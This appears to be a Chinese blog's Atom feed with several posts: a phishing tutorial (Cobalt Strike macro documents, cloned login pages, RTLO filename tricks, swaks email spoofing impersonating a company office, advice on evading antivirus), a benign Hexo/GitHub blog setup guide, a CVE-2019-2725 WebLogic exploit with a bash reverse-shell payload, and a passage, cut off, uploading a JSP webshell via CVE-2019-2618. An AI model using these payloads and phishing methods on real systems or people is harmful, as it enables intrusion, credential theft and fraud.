Raskin发现和命名的，tabnabbing可改变用户浏览网页的标签及接口，以诱导用户输入网络服务的账号与密码。 因此，Raskin将此手法称为标签绑架（tabnapping），他指出当使用者连上一个嵌有第三方script程序或Flash工具的网页时，就会让自己曝露于风险中，因为相关的恶意软件得以侦测使用者经常使用或正在使用的网络服务，在用户暂时离开该网页后，该网页内容及网页标签会悄悄地变身成为伪造的网络服务，并诱导用户输入个人信息</p><ol start="6"><li>鱼叉式网络钓鱼</li></ol><p>指一种源于亚洲与东欧只针对<strong>特定目标</strong>进行攻击的网络钓鱼攻击。</p><p><em>注：</em></p><p><em>水坑攻击</em></p><p><em>水坑攻击”，黑客攻击方式之一，顾名思义，是在受害者必经之路设置了一个“水坑(陷阱)”。最常见的做法是，黑客分析攻击目标的上网活动规律，寻找攻击目标经常访问的网站的弱点，先将此网站“攻破”并植入攻击代码，一旦攻击目标访问该网站就会“中招”。</em></p><p><em>水坑攻击属于APT攻击的一种，与钓鱼攻击相比，黑客无需耗费精力制作钓鱼网站，而是利用合法网站的弱点，隐蔽性比较强。在人们安全意识不断加强的今天，黑客处心积虑地制作钓鱼网站却被有心人轻易识破，而水坑攻击则利用了被攻击者对网站的信任。水坑攻击利用网站的弱点在其中植入攻击代码，攻击代码利用浏览器的缺陷，被攻击者访问网站时终端会被植入恶意程序或者直接被盗取个人重要信息。</em></p><p><em>水坑攻击相对于通过社会工程方式引诱目标用户访问恶意网站更具欺骗性，效率也更高。水坑方法主要被用于有针对性的攻击，而Adobe Reader、Java运行时环境（JRE）、Flash和IE中的零漏洞被用于安装恶意软件。</em></p><ol start="7"><li>U盘钓鱼</li></ol><p>简单来说就是在U盘里面植入木马或者病毒，进行钓鱼</p><p>注：U盘嘛，你可以撇目标单位门口，或者社工个人信息，邮寄给他</p><h2 id="演示环境"><a href="#演示环境" class="headerlink" title="演示环境"></a>演示环境</h2><ul><li><p>服务器：centos 7 </p></li><li><p>服务器：windows 7  </p></li><li><p>服务器：windows 2008 r2</p></li><li><p>攻击机：kali linux  </p></li><li><p>靶机：windows 7  </p></li></ul><h2 id="制作钓鱼邮件内容-Cobalt-strike"><a href="#制作钓鱼邮件内容-Cobalt-strike" class="headerlink" title="制作钓鱼邮件内容-Cobalt strike"></a>制作钓鱼邮件内容-Cobalt strike</h2><p>进入cobalt strike目录</p><p><img src="https://s2.ax1x.com/2019/06/27/ZnN2WQ.png" alt="ZnN2WQ.png"></p><p>启动teamserver</p><p>执行命令<code>sudo ./teamserver 192.168.32.138 mitian</code></p><p><img src="https://s2.ax1x.com/2019/06/27/ZnhFyt.png" alt="ZnhFyt.png"></p><p>新建终端，进入目录，启动客户端</p><p>执行<code>./cobalstrike</code></p><p><img src="https://s2.ax1x.com/2019/06/27/ZnoaE6.png" alt="ZnoaE6.png"></p><p><img src="https://s2.ax1x.com/2019/06/27/Znogbt.png" alt="Znogbt.png"></p><p>新建一个监听器</p><p><img src="https://s2.ax1x.com/2019/06/27/ZnTqQH.png" alt="ZnTqQH.png"></p><p>点击底部add添加</p><p><img src="https://s2.ax1x.com/2019/06/27/Zn7hcQ.png" alt="Zn7hcQ.png"></p><p><img src="https://s2.ax1x.com/2019/06/27/Zn7oBn.png" alt="Zn7oBn.png"></p><p>点击attacks-packages-ms office macro创建word宏病毒</p><p><img src="https://s2.ax1x.com/2019/06/27/ZnH6KJ.png" alt="ZnH6KJ.png"></p><p><img src="https://s2.ax1x.com/2019/06/27/Znb9MQ.png" alt="Znb9MQ.png"></p><p><img src="https://s2.ax1x.com/2019/06/27/ZnbViV.png" alt="ZnbViV.png"></p><p>创建word文档，添加病毒</p><p><img src="https://s2.ax1x.com/2019/06/27/ZnqntP.png" alt="ZnqntP.png"></p><p><img src="https://s2.ax1x.com/2019/06/27/ZnqUhV.png" alt="ZnqUhV.png"></p><p>正文随便加点东西【当然我这是测试，加什么都行】</p><p><img src="https://s2.ax1x.com/2019/06/27/Znqgtx.png" alt="Znqgtx.png"></p><h2 id="钓鱼网站的制作"><a href="#钓鱼网站的制作" class="headerlink" title="钓鱼网站的制作"></a>钓鱼网站的制作</h2><h3 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h3><p>上面是利用cobalstrike制作一个word文档的病毒，当然你也可以使用它clone一个网站</p><p>点击attacks—web drive-by — clone site,添加你要克隆的网站，我选的补天登陆页面</p><p><img src="https://s2.ax1x.com/2019/06/27/ZnXnt1.png" alt="ZnXnt1.png"></p><p><img src="https://s2.ax1x.com/2019/06/27/ZnXQ1K.png" alt="ZnXQ1K.png"></p><p>访问192.168.32.142:80</p><p><img src="https://s2.ax1x.com/2019/06/27/ZnXy7j.png" alt="ZnXy7j.png"></p><p>当然最好是自己搭建一个钓鱼网站，上面是演示</p><h3 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h3><p>打开kali linux 的Social-Engineer Toolkit</p><p><img src="https://s2.ax1x.com/2019/06/27/ZnjcrD.png" alt="ZnjcrD.png"></p><p>【或者终端输入setoolkit启动】</p><p><img src="https://s2.ax1x.com/2019/06/27/Znjvin.png" alt="Znjvin.png"></p><p>选择1 社会工程学攻击，出现下图</p><p><img src="https://s2.ax1x.com/2019/06/27/ZnvgS0.png" alt="ZnvgS0.png"></p><p>选择2 网站攻击，出现下图</p><p><img src="https://s2.ax1x.com/2019/06/27/ZnvL6K.png" alt="ZnvL6K.png"></p><p>选择3 钓鱼网站攻击，出现下图</p><p><img src="https://s2.ax1x.com/2019/06/27/ZnxF6f.png" alt="ZnxF6f.png"></p><p>选择2 网站克隆，出现下图</p><p>并输入ip，这里已经给出了</p><p><a href="https://imgchr.com/i/ZnxMpq" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/06/27/ZnxMpq.png" alt="ZnxMpq.png"></a></p><p>输入要克隆的网站</p><p><img src="https://s2.ax1x.com/2019/06/27/Znzr2q.png" alt="Znzr2q.png"></p><p>到这的时候输入一个Y</p><p><img src="https://s2.ax1x.com/2019/06/27/ZuSMLT.png" alt="ZuSMLT.png"></p><p>访问网站</p><p><img src="https://s2.ax1x.com/2019/06/27/ZupUhj.png" alt="ZupUhj.png"></p><p>假装受害者登陆，输入用户和密码</p><p><img src="https://s2.ax1x.com/2019/06/27/Zup0cq.png" alt="Zup0cq.png"></p><p>kali 终端显示信息</p><p><img src="https://s2.ax1x.com/2019/06/27/ZuEPOA.png" alt="ZuEPOA.png"></p><p><strong>注：Social-Engineer Toolkit有很多玩法，比如鱼叉，钓鱼二维码，wifi等，使用方法大同小异，自行研究</strong></p><h3 id="方法三"><a href="#方法三" class="headerlink" title="方法三"></a>方法三</h3><p>自己搭建一个，比如QQ空间</p><p>找个QQ空间的源码，放到服务器上</p><p><img src="https://s2.ax1x.com/2019/06/27/ZuZeMQ.png" alt="ZuZeMQ.png"></p><p>访问，输入用户mitian,密码mitian</p><p><img src="https://s2.ax1x.com/2019/06/27/ZuZnqs.png" alt="ZuZnqs.png"></p><p>访问后台</p><p><img src="https://s2.ax1x.com/2019/06/27/ZumXGV.png" alt="ZumXGV.png"></p><h2 id="U盘钓鱼"><a href="#U盘钓鱼" class="headerlink" title="U盘钓鱼"></a>U盘钓鱼</h2><h3 id="Unicode-RTLO"><a href="#Unicode-RTLO" class="headerlink" title="Unicode RTLO"></a>Unicode RTLO</h3><p>RIGHT TO LEVER OVERRIDE是一种Unicode，主要用于书写和阅读阿拉伯语或希伯来语文本。Unicode有一个特殊字符U + 202e，它告诉计算机以从右到左的顺序显示它后面的文本。此漏洞用于伪装文件名称。例如，caijueexe.doc的文件名实际上是caijuedoc.exe的可执行文件</p><ol><li>准备一个bat文件</li></ol><p><img src="https://s2.ax1x.com/2019/06/30/Z1b2Tg.png" alt="Z1b2Tg.png"></p><ol start="2"><li>鼠标右键—重命名—插入Unicode字符—选择RLO–输入“txt.bat”<br><img src="https://s2.ax1x.com/2019/06/30/Z1qtcq.png" alt="Z1qtcq.png"></li><li>显示如下，看到的是一个以txt结尾的文件，但实际上却是从右开始读的bat文件，在属性里面可以看到<br><img src="https://s2.ax1x.com/2019/06/30/Z1qbvt.png" alt="Z1qbvt.png"><br><img src="https://s2.ax1x.com/2019/06/30/Z1LpCj.png" alt="Z1LpCj.png"></li></ol><p>4.假如目标以为这是一个txt文本，双击执行一下</p><p><img src="https://s2.ax1x.com/2019/06/30/Z1L5LV.png" alt="Z1L5LV.png"></p><h2 id="邮件伪造发送之SWAKS"><a href="#邮件伪造发送之SWAKS" class="headerlink" title="邮件伪造发送之SWAKS"></a>邮件伪造发送之SWAKS</h2><ol><li>测试是否可以和目标邮箱发送数据</li></ol><p>执行命令：<code>swaks –to [136*****@qq.com]</code></p><p><img src="https://s2.ax1x.com/2019/06/30/Z3uTvn.gif" alt="Z3uTvn.gif"></p><ol start="2"><li>swaks参数说明</li></ol><p>执行命令：<code>swaks –help</code> 可以看到n多参数和实例</p><p><img src="https://s2.ax1x.com/2019/06/27/ZuKGDg.png" alt="ZuKGDg.png"></p><p>–to 目标邮箱</p><p>–from 邮件发送者</p><p>–attach 添加附件</p><p>–header-From 邮件头 </p><p>–header “Subject:主题” 邮件主题</p><ol start="3"><li>发送钓鱼邮件</li></ol><p>执行</p><p><code>swaks --to 136****46@qq.com --from l***ng@qianxin.com --h-From: &#39;&quot;总裁办&quot;&lt;admin@qianxin.com&gt;&#39; --header &quot;Subject: 关于集团报告渗透测试word模板更新的通告&quot; --body &quot;各位一线工程师，集团对外word统一格式，请下载附件使用，谢谢合作！&quot; --attach-name 渗透报告模版.doc --attach-type application/msword --attach /tmp/渗透报告模版.doc</code></p><p><strong>注： attach-type是传输文件的MIME类型</strong></p><pre><code>**attach-name是名字** </code></pre><p><strong>理论上不加这两个也可以的，不过我这里面不加有点小问题</strong></p><p><img src="https://s2.ax1x.com/2019/06/27/ZuQg91.png" alt="ZuQg91.png"></p><p><img src="https://s2.ax1x.com/2019/06/27/ZulEuT.png" alt="ZulEuT.png"></p><p>伪造发送成功</p><ol start="4"><li>cobalstrike主机上线啦！</li></ol><p>假装受害者打开word</p><p>滴！肉鸡上线</p><p><img src="https://s2.ax1x.com/2019/06/27/Zu1pqO.png" alt="Zu1pqO.png"></p><p><img src="https://s2.ax1x.com/2019/06/27/Zu1NLT.png" alt="Zu1NLT.png"></p><h2 id="邮件伪造发送之EMKEI’SMAILER"><a href="#邮件伪造发送之EMKEI’SMAILER" class="headerlink" title="邮件伪造发送之EMKEI’SMAILER"></a>邮件伪造发送之EMKEI’SMAILER</h2><p>在线的邮件伪造发送工具</p><p>网址：<a href="https://emkei.cz/" target="_blank" rel="noopener">https://emkei.cz/</a></p><p><img src="https://s2.ax1x.com/2019/06/27/Zu3lnK.png" alt="Zu3lnK.png"></p><p><img src="https://s2.ax1x.com/2019/06/27/Zu3DHS.png" alt="Zu3DHS.png"></p><p>简单试了试139邮箱，噢哟可以哦！</p><p><img src="https://s2.ax1x.com/2019/06/27/Zu3Rcq.png" alt="Zu3Rcq.png"></p><p>附赠一个：邮箱匿名注册的网站</p><p>网址：<a href="http://www.yopmail.com" target="_blank" rel="noopener">http://www.yopmail.com</a></p><p><strong>注：邮件发送，还可以自己搭建SMTP服务，之后使用诸如SimpleEmailSpoofer等伪造域名发送。</strong></p><h2 id="伪造钓鱼邮件注意事项"><a href="#伪造钓鱼邮件注意事项" class="headerlink" title="伪造钓鱼邮件注意事项"></a>伪造钓鱼邮件注意事项</h2><ol><li>钓鱼嘛，鱼饵肯定要诱人才会有鱼上钩,比如：美女图片、中奖</li><li>尽量仿造的像真的一样，注意：签名、模版、图标、落款等细节</li><li>网站，链接等钓鱼，最好用相似度较高的域名</li><li>附件肯定要过杀软！！！【百度一下肯定有】</li></ol><h2 id="钓鱼邮件防范"><a href="#钓鱼邮件防范" class="headerlink" title="钓鱼邮件防范"></a>钓鱼邮件防范</h2><ol><li>不要轻易相信邮件里的附件，比如word里的宏</li><li>注册链接，中奖链接不要轻易相信</li><li>注意邮件行文风格、落款、签名等地方</li><li>服务器响应快慢，一般钓鱼的服务器配置都不是很高</li><li>如果突然有封邮件言辞激励，请不要回复，因为它可能在社工你的邮件签名等信息</li></ol><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>总结个锤子…</p><p><img src="https://s2.ax1x.com/2019/06/27/ZuJZtg.png" alt="ZuJZtg.png"></p><p><strong>本人作者裁决， 转载请注明出处</strong></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;img src=&quot;https://s2.ax1x.com/2019/06/28/ZMdqxS.jpg&quot; alt=&quot;ZMdqxS.jpg&quot;&gt;&lt;/p&gt;
&lt;h2 id=&quot;钓鱼方式&quot;&gt;&lt;a href=&quot;#钓鱼方式&quot; class=&quot;headerlink&quot; title=&quot;钓鱼方式&quot;&gt;
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Github Vmware搭建个人博客</title>
    <link href="http://lilifengcode.github.io/post/c1c53e6d.html"/>
    <id>http://lilifengcode.github.io/post/c1c53e6d.html</id>
    <published>2019-06-27T14:20:04.000Z</published>
    <updated>2019-06-28T08:25:01.143Z</updated>
    
    <content type="html"><![CDATA[<p><img src="https://s2.ax1x.com/2019/06/27/Zu2d0O.jpg" alt="Zu2d0O.jpg"></p><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>重新搭建github博客，之前没有记录。这次托挖矿木马的福，我终于可以重新搭建一次了</p><p>建议<code>虚拟机上搭建</code>，即使换电脑了，重做系统了，也不用再搞了</p><h2 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h2><ul><li>虚拟机             windows 7 x64 </li><li>node.js           地址： <a href="http://nodejs.cn/download/" target="_blank" rel="noopener">http://nodejs.cn/download/</a></li><li>git                    地址：<a href="https://gitforwindows.org/" target="_blank" rel="noopener">https://gitforwindows.org/</a>  </li><li>github账号     注册</li></ul><h2 id="流程"><a href="#流程" class="headerlink" title="流程"></a>流程</h2><p><img src="https://s2.ax1x.com/2019/06/26/ZmKP4P.gif" alt="ZmKP4P.gif"></p><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p>安装git、node.js</p><p><img src="https://s2.ax1x.com/2019/06/26/Zml3gf.gif" alt="Zml3gf.gif"></p><p>之后新建一个文件夹blog,鼠标右键点击git bash here</p><p>执行命令<code>npm install -g hexo</code>和<code>hexo init</code></p><p><img src="https://s2.ax1x.com/2019/06/26/Zm3fc6.gif" alt="Zm3fc6.gif"></p><p>执行<code>hexo server</code>,即可以本地访问博客环境【127.0.0.1：4000】</p><p><img src="https://s2.ax1x.com/2019/06/26/Zm8B8I.gif" alt="Zm8B8I.gif"></p><p>执行：<code>npm install hexo-deployer-git --save</code></p><p>​           <code>git config --global user.email &quot;邮箱&quot;</code></p><p>​           <code>git config --global user.name &quot;名字&quot;</code> </p><p>为后面部署做准备</p><p>接下来，注册一个github账号，新建一个仓库命名：…..github.io</p><p><img src="https://s2.ax1x.com/2019/06/26/ZmtldO.gif" alt="ZmtldO.gif"></p><p><img src="https://s2.ax1x.com/2019/06/26/ZmNfgA.gif" alt="ZmNfgA.gif"></p><p>本地和github,建立连接 <code>cd ~./ssh</code></p><p><img src="https://s2.ax1x.com/2019/06/26/ZmNIDP.png" alt="ZmNIDP.png"></p><p>第一次，显示上图</p><p>执行<code>ssh-keygen -t rsa -C &quot;邮件地址&quot;</code> 点击回车三次</p><p><img src="https://s2.ax1x.com/2019/06/26/ZmUP5F.gif" alt="ZmUP5F.gif"></p><p>打开<code>.ssh\id_rsa.pub</code>复制里面的秘钥</p><p><img src="https://s2.ax1x.com/2019/06/26/ZmUuVK.gif" alt="ZmUuVK.gif"></p><p>打开github主页，进入个人设置 -&gt; SSH and GPG keys -&gt; New SSH key</p><p><img src="https://s2.ax1x.com/2019/06/27/ZmU8xA.gif" alt="ZmU8xA.gif"></p><p>执行<code>ssh -T gi@github.com</code></p><p><img src="https://s2.ax1x.com/2019/06/27/ZmU0Pg.gif" alt="ZmU0Pg.gif"></p><p>修改全局的<code>_config.yml</code></p><p><img src="https://s2.ax1x.com/2019/06/27/ZmaFdf.gif" alt="ZmaFdf.gif"></p><p>我这个直接将之前的文件夹覆盖了</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>总之就是，<code>本地先部署</code>好，之后<code>github建立一个仓库</code>，再通过<code>ssh key</code>将本地和github的仓库进行<code>连接</code>，其他的就是丰富内容了</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;img src=&quot;https://s2.ax1x.com/2019/06/27/Zu2d0O.jpg&quot; alt=&quot;Zu2d0O.jpg&quot;&gt;&lt;/p&gt;
&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Weblogic反序列化RCE复现(CVE-2019-2725)</title>
    <link href="http://lilifengcode.github.io/post/ef4f4b9c.html"/>
    <id>http://lilifengcode.github.io/post/ef4f4b9c.html</id>
    <published>2019-04-28T15:20:25.000Z</published>
    <updated>2019-06-28T08:25:01.143Z</updated>
    
    <content type="html"><![CDATA[<p><img src="https://s2.ax1x.com/2019/06/24/ZEl0Et.jpg" alt="ZEl0Et.jpg"></p><h2 id="漏洞-介绍"><a href="#漏洞-介绍" class="headerlink" title="漏洞-介绍"></a>漏洞-介绍</h2><p>Oracle WebLogic Server是一个企业应用程序服务器。</p><p>由于反序列化输入信息，Oracle WebLogic Server容易出现远程命令执行漏洞。具体来说，此问题会影响’wls9_async’和’wls-wsat’组件。攻击者可以利用此问题执行任意命令。</p><p>攻击者可以利用此问题在运行受影响的应用程序的用户的上下文中执行任意命令。漏洞利用尝试失败可能导致拒绝服务条件。  </p><h2 id="漏洞-影响版本"><a href="#漏洞-影响版本" class="headerlink" title="漏洞-影响版本"></a>漏洞-影响版本</h2><p>Oracle WebLogic Server：</p><ul><li>10.X.X.X.X</li><li>12.1.3.0.0</li></ul><h2 id="漏洞-环境搭建"><a href="#漏洞-环境搭建" class="headerlink" title="漏洞-环境搭建"></a>漏洞-环境搭建</h2><p>用的<a href="https://vulhub.org/" target="_blank" rel="noopener">vulhub</a> CVE-2017-10271 两者影响版本差不多</p><p><img src="https://s2.ax1x.com/2019/04/18/EpC3cT.md.png" alt></p><p><img src="https://s2.ax1x.com/2019/06/24/ZEklkj.png" alt="ZEklkj.png"></p><p><img src="https://s2.ax1x.com/2019/06/24/ZEAy5j.png" alt="ZEAy5j.png"></p><h2 id="漏洞-验证"><a href="#漏洞-验证" class="headerlink" title="漏洞-验证"></a>漏洞-验证</h2><p>访问…/_async和…/_async/AsyncResponseService来测试是否启用了wls9_asyn组件，则存在该漏洞</p><p>访问<code>http://192.168.32.140:7001/_async/</code> 403禁止访问代表存在</p><p><img src="https://s2.ax1x.com/2019/06/24/ZEE4SI.png" alt="ZEE4SI.png"></p><p>访问<code>http://192.168.32.140:7001/_async/AsyncResponseService</code> </p><p><img src="https://s2.ax1x.com/2019/06/24/ZEZp8A.png" alt="ZEZp8A.png"></p><p>本机开启nc监听7777端口，为后面反弹shell做准备</p><p><a href="https://imgchr.com/i/ZEnsaT" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/06/24/ZEnsaT.png" alt="ZEnsaT.png"></a></p><p>构造poc</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">POST /_async/AsyncResponseService HTTP/1.1</span><br><span class="line">Host: ip:port</span><br><span class="line">Content-Length: 791</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">SOAPAction:</span><br><span class="line">Accept: */*</span><br><span class="line">User-Agent: Apache-HttpClient/4.1.1 (java 1.5)</span><br><span class="line">Connection: keep-alive</span><br><span class="line">content-type: text/xml</span><br><span class="line"></span><br><span class="line">&lt;soapenv:Envelope xmlns:soapenv=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot; xmlns:wsa=&quot;http://www.w3.org/2005/08/addressing&quot; xmlns:asy=&quot;http://www.bea.com/async/AsyncResponseService&quot;&gt;   </span><br><span class="line">&lt;soapenv:Header&gt; </span><br><span class="line">&lt;wsa:Action&gt;xx&lt;/wsa:Action&gt;</span><br><span class="line">&lt;wsa:RelatesTo&gt;xx&lt;/wsa:RelatesTo&gt;</span><br><span class="line">&lt;work:WorkContext xmlns:work=&quot;http://bea.com/2004/06/soap/workarea/&quot;&gt;</span><br><span class="line">&lt;void class=&quot;java.lang.ProcessBuilder&quot;&gt;</span><br><span class="line">&lt;array class=&quot;java.lang.String&quot; length=&quot;3&quot;&gt;</span><br><span class="line">&lt;void index=&quot;0&quot;&gt;</span><br><span class="line">&lt;string&gt;/bin/bash&lt;/string&gt;</span><br><span class="line">&lt;/void&gt;</span><br><span class="line">&lt;void index=&quot;1&quot;&gt;</span><br><span class="line">&lt;string&gt;-c&lt;/string&gt;</span><br><span class="line">&lt;/void&gt;</span><br><span class="line">&lt;void index=&quot;2&quot;&gt;</span><br><span class="line">&lt;string&gt;bash -i &amp;gt;&amp;amp; /dev/tcp/192.168.0.226/7777 0&amp;gt;&amp;amp;1&lt;/string&gt;</span><br><span class="line">&lt;/void&gt;</span><br><span class="line">&lt;/array&gt;</span><br><span class="line">&lt;void method=&quot;start&quot;/&gt;&lt;/void&gt;</span><br><span class="line">&lt;/work:WorkContext&gt;</span><br><span class="line">&lt;/soapenv:Header&gt;</span><br><span class="line">&lt;soapenv:Body&gt;</span><br><span class="line">&lt;asy:onAsyncDelivery/&gt;</span><br><span class="line">&lt;/soapenv:Body&gt;&lt;/soapenv:Envelope&gt;</span><br></pre></td></tr></table></figure><p>打开burp,抓包-改包-发包</p><p><img src="https://s2.ax1x.com/2019/06/24/ZEKMHP.png" alt="ZEKMHP.png"></p><p>反弹shell成功</p><p><img src="https://s2.ax1x.com/2019/06/24/ZEK34S.png" alt="ZEK34S.png"></p><h2 id="漏洞-修复建议"><a href="#漏洞-修复建议" class="headerlink" title="漏洞-修复建议"></a>漏洞-修复建议</h2><ul><li><p>删除该war包并重启WebLogic服务，具体文件路径如下：</p><p>Weblogic9*版本：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/%WLS_HOME%/weblogic92/server/lib/bea_wls9_async_response.war</span><br></pre></td></tr></table></figure><p>Weblogic 10*版本：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/%WLS_HOME%/wlserver_10.3/server/lib/bea_wls9_async_response.war</span><br></pre></td></tr></table></figure><p>Weblogic12*版本：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/%WLS_HOME%/oracle_common/modules/com.oracle.webservices.wls.bea-wls9-async-response_12.1.3.war</span><br></pre></td></tr></table></figure><p>注：wls9_async_response.war属于一级应用包，对其进行移除或更名操作可能造成未知的后果，Oracle官方不建议对其进行此类操作。</p></li><li><p>通过访问策略控制禁止<code>/_async/*</code>路径的URL访问</p></li><li><p>官方补丁：<a href="https://www.oracle.com/technetwork/security-advisory/alert-cve-2019-2725-5466295.html" target="_blank" rel="noopener">https://www.oracle.com/technetwork/security-advisory/alert-cve-2019-2725-5466295.html</a></p></li><li></li></ul><h2 id="参考-出处"><a href="#参考-出处" class="headerlink" title="参考-出处"></a>参考-出处</h2><ul><li><p><a href="https://www.symantec.com/security_response/attacksignatures/detail.jsp?asid=31477" target="_blank" rel="noopener">https://www.symantec.com/security_response/attacksignatures/detail.jsp?asid=31477</a></p></li><li><p><a href="https://www.cnvd.org.cn/webinfo/show/4989" target="_blank" rel="noopener">https://www.cnvd.org.cn/webinfo/show/4989</a></p></li><li><p><a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-2725" target="_blank" rel="noopener">http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-2725</a></p></li><li><p><a href="https://laucyun.com/f6ab68189c34ec5d1cd7c77930e55d1f.html" target="_blank" rel="noopener">https://laucyun.com/f6ab68189c34ec5d1cd7c77930e55d1f.html</a></p></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;img src=&quot;https://s2.ax1x.com/2019/06/24/ZEl0Et.jpg&quot; alt=&quot;ZEl0Et.jpg&quot;&gt;&lt;/p&gt;
&lt;h2 id=&quot;漏洞-介绍&quot;&gt;&lt;a href=&quot;#漏洞-介绍&quot; class=&quot;headerlink&quot; title=&quot;漏洞-介
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>CVE-2019-2618</title>
    <link href="http://lilifengcode.github.io/post/c468c7fd.html"/>
    <id>http://lilifengcode.github.io/post/c468c7fd.html</id>
    <published>2019-04-18T13:10:13.000Z</published>
    <updated>2019-06-28T08:25:01.143Z</updated>
    
    <content type="html"><![CDATA[<p><img src="https://s2.ax1x.com/2019/05/19/EXaxld.jpg" alt="EXaxld.jpg"></p><h2 id="漏洞-介绍"><a href="#漏洞-介绍" class="headerlink" title="漏洞-介绍"></a>漏洞-介绍</h2><p>CVE-2019-2618 文件上传</p><p>CVE-2019-1615任意文件读取</p><p>PS :这两个漏洞都需要OAM认证，也就是需要账号密码；之后weblogic正常deploy 本身就可以部署war文件，就像上传shell一样，，，咳咳</p><h2 id="漏洞-影响版本"><a href="#漏洞-影响版本" class="headerlink" title="漏洞-影响版本"></a>漏洞-影响版本</h2><p>Oracle WebLogic Server：</p><ul><li>10.3.6.0.0</li><li>12.1.3.0.0</li><li>12.2.1.3.0</li></ul><h2 id="漏洞-环境搭建"><a href="#漏洞-环境搭建" class="headerlink" title="漏洞-环境搭建"></a>漏洞-环境搭建</h2><p>用的<a href="https://vulhub.org/" target="_blank" rel="noopener">vulhub</a> CVE-2017-10271 两者影响版本差不多</p><p><img src="https://s2.ax1x.com/2019/04/18/EpC3cT.md.png" alt></p><p><img src="https://s2.ax1x.com/2019/05/18/EOldQU.png" alt="EOldQU.png"></p><h2 id="漏洞-验证"><a href="#漏洞-验证" class="headerlink" title="漏洞-验证"></a>漏洞-验证</h2><p>前提：weblogic弱密码，可猜解；vulhub默认密码：weblogic/Oracle@123</p><p>上传地址随便找了一个../tmp/_WL_internal/bea_wls_deployment_internal/gyuitk/war</p><p>抓包改包</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">POST /bea_wls_deployment_internal/DeploymentService HTTP/1.1</span><br><span class="line">Host:192.168.32.140:7001</span><br><span class="line">Connection: close</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: */*</span><br><span class="line">User-Agent: python-requests/2.21.0</span><br><span class="line">username: weblogic</span><br><span class="line">wl_request_type: app_upload</span><br><span class="line">cache-control: no-cache</span><br><span class="line">wl_upload_application_name:../tmp/_WL_internal/bea_wls_deployment_internal/gyuitk/war</span><br><span class="line">serverName: weblogic</span><br><span class="line">password: Oracle@123</span><br><span class="line">content-type: multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW</span><br><span class="line">archive: true</span><br><span class="line">server_version: 10.3.6.0</span><br><span class="line">wl_upload_delta: true</span><br><span class="line">Content-Length: 605</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundary7MA4YWxkTrZu0gW</span><br><span class="line">Content-Disposition: form-data; name=&quot;shell.jsp&quot;; filename=&quot;webshell.jsp&quot;</span><br><span class="line">Content-Type: false</span><br><span class="line"></span><br><span class="line">&lt;%</span><br><span class="line">    if(&quot;123&quot;.equals(request.getParameter(&quot;pwd&quot;)))&#123;</span><br><span class="line">        java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter(&quot;cmd&quot;)).getInputStream();</span><br><span class="line">        int a = -1;          </span><br><span class="line">        byte[] b = new byte[1024];          </span><br><span class="line">        out.print(&quot;&lt;pre&gt;&quot;);          </span><br><span class="line">        while((a=in.read(b))!=-1)&#123;</span><br><span class="line">            out.println(new String(b));          </span><br><span class="line">        &#125;</span><br><span class="line">        out.print(&quot;&lt;/pre&gt;&quot;);</span><br><span class="line">    &#125; </span><br><span class="line">    